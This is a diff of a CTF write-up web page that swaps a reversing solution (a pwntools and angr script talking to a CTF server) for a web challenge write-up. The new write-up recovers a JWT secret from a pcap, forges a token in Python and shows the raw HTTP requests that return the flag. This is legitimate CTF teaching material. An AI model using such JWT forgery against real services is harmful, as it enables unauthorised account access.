@@ -6,12 +6,12 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         
         
-        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/reversing/ByteBandits20/Auto-Bot/intro/">
-        <link rel="shortcut icon" href="../../../../img/favicon.ico">
-        <title>Auto_bot - CTF-Writeups</title>
-        <link href="../../../../css/bootstrap-custom.min.css" rel="stylesheet">
-        <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
-        <link href="../../../../css/base.css" rel="stylesheet">
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/web/DawgCTF20/freewifi2/">
+        <link rel="shortcut icon" href="../../../img/favicon.ico">
+        <title>Freewifi2 - CTF-Writeups</title>
+        <link href="../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../css/base.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atelier-forest-light.min.css">
         <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
         <!--[if lt IE 9]>
@@ -19,8 +19,8 @@
             <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
         <![endif]-->
 
-        <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
-        <script src="../../../../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../js/bootstrap-3.0.3.min.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
         <script>hljs.initHighlightingOnLoad();</script> 
     </head>
@@ -39,7 +39,7 @@
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                     </button>
-                    <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
+                    <a class="navbar-brand" href="../../..">CTF-Writeups</a>
                 </div>
 
                 <!-- Expanded navigation -->
@@ -47,7 +47,7 @@
                         <!-- Main navigation -->
                         <ul class="nav navbar-nav">
                             <li >
-                                <a href="../../../../about/">About Us</a>
+                                <a href="../../../about/">About Us</a>
                             </li>
                             <li >
                                 <a href="https://team-shakti.github.io/">Website</a>
@@ -61,7 +61,7 @@
                             </a>
                         </li>
                             <li>
-                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/reversing/ByteBandits20/Auto-Bot/intro.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/web/DawgCTF20/freewifi2.md">Edit on Team-Shakti/CTF-Write-ups</a>
                             </li>
                     </ul>
                 </div>
@@ -71,44 +71,82 @@
         <div class="container">
                 <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
     <ul class="nav bs-sidenav">
-        <li class="main active"><a href="#auto_bot">Auto_bot</a></li>
+        <li class="main active"><a href="#freewifi2">FreeWifi2</a></li>
+            <li><a href="#ideas">Ideas:</a></li>
     </ul>
 </div></div>
                 <div class="col-md-9" role="main">
 
-<h1 id="auto_bot">Auto_bot</h1>
-<p>Challenge was solved by: Sandra and Ashwathi <br />
-When we connected to the server we got a base64 encoded binary. Using bash we recieved the decoded binary and anylised it. But each time it was a new binary. 
-Heres the scritp</p>
-<pre><code>from pwn import *
-import base64
-import subprocess
-import angr
-import sys
-r = remote('pwn.byteband.it', 6000)
-flag = open('flag.txt', 'w')
-while(1):
-    o = r.recvuntil(&quot;\n&quot;)
-    flag.write(str(o))
-    out = base64.b64decode(o)
-    n=open(&quot;new&quot;,&quot;wb&quot;)
-    n.write(out)
-    n.close()
-    subprocess.call(['chmod','+x','new'])
-    project = angr.Project(&quot;./new&quot;)
-    initial_state = project.factory.entry_state()
-    simulation = project.factory.simgr(initial_state)
-    simulation.explore(find = lambda s: b&quot;good job&quot; in s.posix.dumps(1) in s.posix.dumps(1))
-    if simulation.found:
-        solution_state=simulation.found[0]
-        r.sendline(solution_state.posix.dumps(sys.stdin.fileno()))
-        #in = inp[2:len(inp)-1]
-    else:
-        raise Exception('could not find solution:')
-    #r.sendline(in)
-#flag{0pt1mus_pr1m3_has_chosen_you}
+<h2 id="freewifi2">FreeWifi2</h2>
+<p>There is a pcap given.
+On TCP Stream 48, we can find the username: <em>true.grit@umbccd.io</em>
+In addition, there are three interesting endpoints in the pcap. 
+You can go over all the tcp streams and eventually, you find the below details:
+- /jwtlogin
+- /forgotpassword.html
+- /staff.html (this got a flag which is the solution for FreeWifi1.)</p>
+<p>Trying to login with username:password as true.grit@umbccd.io:true.grit@umbccd.io gives the following token in the response:
+<em>&lt; JWT 'identity'=31337 &gt;</em></p>
+<p><strong>HTTP Request:</strong></p>
+<pre><code>POST /staff.html HTTP/1.1
+Host: freewifi.ctf.umbccd.io
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 178
+Origin: https://freewifi.ctf.umbccd.io
+Connection: close
+Referer: https://freewifi.ctf.umbccd.io/staff.html
+Cookie: session=eyJjc3JmX3Rva2VuIjoiY2MwZjFmODY4ZWRiOTgzNTUxYzBhM2FiMzFmNDExODJiY2ViYTA5MyJ9.XpGbsA.Afj_d2U1FAfOy_LNDW-ucVcxN94; WifiKey nonce=MjAyMC0wNC0xMSAxMDozOA==; WifiKey alg=SHA1
+Upgrade-Insecure-Requests: 1
+csrf_token=ImNjMGYxZjg2OGVkYjk4MzU1MWMwYTNhYjMxZjQxMTgyYmNlYmEwOTMi.XpGeNA.1eSf_9aW6Z1u9djuBDm_N9KhO8M&amp;username=true.grit%40umbccd.io&amp;password=true.grit%40umbccd.io&amp;submit=Submit
+</code></pre>
 
-</code></pre></div>
+<p><strong>HTTP Response:</strong></p>
+<pre><code>HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Sat, 11 Apr 2020 10:39:07 GMT
+Content-Type: text/html; charset=utf-8
+Connection: close
+Set-Cookie: WifiKey nonce=MjAyMC0wNC0xMSAxMDozOQ==; Path=/
+Set-Cookie: WifiKey alg=SHA1; Path=/
+Set-Cookie: JWT 'identity'=31337; Path=/
+Vary: Cookie
+Content-Length: 2666
+</code></pre>
+
+<h3 id="ideas">Ideas:</h3>
+<p>I think the goal is to login with /jwtlogin
+We have identity from the above request. In addition, there is additional information from the pcap about a secret:</p>
+<pre><code>Set-Cookie: JWT 'secret'=&quot;dawgCTF?heckin#bamboozle&quot;; Path=/
+</code></pre>
+
+<p>Using, this two values, I tried creating a JWT token using python. </p>
+<pre><code class="Python">import jwt
+print jwt.encode({'identity':31337,'exp':1614291780,'iat':1475878357,'nbf':1475878357},'dawgCTF?heckin#bamboozle',algorithm='HS256')
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA
+</code></pre>
+
+<p>Below is the request that gave me the flag: </p>
+<p><strong>HTTP Request</strong></p>
+<pre><code>GET /jwtlogin HTTP/1.1
+Host: freewifi.ctf.umbccd.io
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE0NzU4NzgzNTcsImV4cCI6MTYxNDI5MTc4MCwiaWRlbnRpdHkiOjMxMzM3LCJuYmYiOjE0NzU4NzgzNTd9.ij7mhvj4dBoqFP91aItAp-TMHkaCbOq9tjyV43dP8AA
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Length: 2
+</code></pre>
+
+<p>You have the flag in the reponse. </p>
+<blockquote>
+<p>DawgCTF{y0u_d0wn_w!t#_JWT?}</p>
+</blockquote></div>
         </div>
 
         <footer class="col-md-12">
@@ -117,12 +155,12 @@ while(1):
             <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
         </footer>
         <script>
-            var base_url = "../../../..",
+            var base_url = "../../..",
                 shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
         </script>
-        <script src="../../../../js/base.js" defer></script>
+        <script src="../../../js/base.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
-        <script src="../../../../search/main.js" defer></script>
+        <script src="../../../search/main.js" defer></script>
 
         <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
     <div class="modal-dialog">
